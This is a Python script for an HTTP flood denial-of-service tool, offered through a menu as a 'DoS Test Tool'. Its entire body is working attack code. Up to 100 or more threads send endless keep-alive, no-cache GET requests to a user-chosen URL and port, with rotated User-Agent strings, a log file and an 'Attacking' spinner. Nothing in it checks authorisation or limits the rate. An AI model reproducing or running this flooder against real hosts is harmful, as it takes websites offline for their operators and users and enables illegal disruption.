import requests
import threading
import random
import logging
import signal
import sys
import re
import itertools
import time
from concurrent.futures import ThreadPoolExecutor

# List of User-Agent strings for randomization
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.3 Safari/602.3.12"
]

# Graceful shutdown
def signal_handler(sig, frame):
    print('\nStopping attack...')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Validate target URL
def is_valid_host(host):
    regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' # domain...
        r'localhost|' # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' # ...or ipv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)' # ...or ipv6
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, host) is not None

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
file_handler = logging.FileHandler("attack.log")
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
logging.getLogger().addHandler(file_handler)

def send_request(target_url, port):
    headers = {
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "User-Agent": random.choice(user_agents)
    }
    full_url = f"{target_url}:{port}"
    while True:
        try:
            response = requests.get(full_url, headers=headers)
            logging.info(f"Sent request to {full_url}, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")

def loading_animation():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if not threading.main_thread().is_alive():
            break
        sys.stdout.write('\rAttacking ' + c)
        sys.stdout.flush()
        time.sleep(0.1)

def start_attack(target_url, port, threads):
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(send_request, target_url, port) for _ in range(threads)]
        for future in futures:
            try:
                future.result()
            except Exception as e:
                logging.error(f"Thread raised an exception: {e}")

def main_menu():
    target_url = None
    port = 80
    threads = 100

    while True:
        print("\nKeepAlive+NoCache DoS Test Tool")
        print("1. Start Attack")
        print("2. Set Target URL")
        print("3. Set Port")
        print("4. Set Number of Threads")
        print("5. Exit")
        choice = input("Enter your choice: ")
        if choice == '1':
            if not target_url:
                print("Target URL is not set. Please set the target URL first.")
            else:
                print(f"Starting attack on {target_url}:{port} with {threads} threads...")
                start_attack(target_url, port, threads)
        elif choice == '2':
            new_url = input("Enter the target URL: ")
            if is_valid_host(new_url):
                target_url = new_url
                print(f"Target URL set to {target_url}")
            else:
                print("Invalid URL. Please enter a valid URL.")
        elif choice == '3':
            try:
                new_port = int(input("Enter the port number: "))
                if 1 <= new_port <= 65535:
                    port = new_port
                    print(f"Port set to {port}")
                else:
                    print("Port number must be between 1 and 65535.")
            except ValueError:
                print("Invalid input. Please enter a valid port number.")
        elif choice == '4':
            try:
                new_threads = int(input("Enter the number of threads: "))
                if new_threads > 0:
                    threads = new_threads
                    print(f"Number of threads set to {threads}")
                else:
                    print("Number of threads must be greater than 0.")
            except ValueError:
                print("Invalid input. Please enter a valid number.")
        elif choice == '5':
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()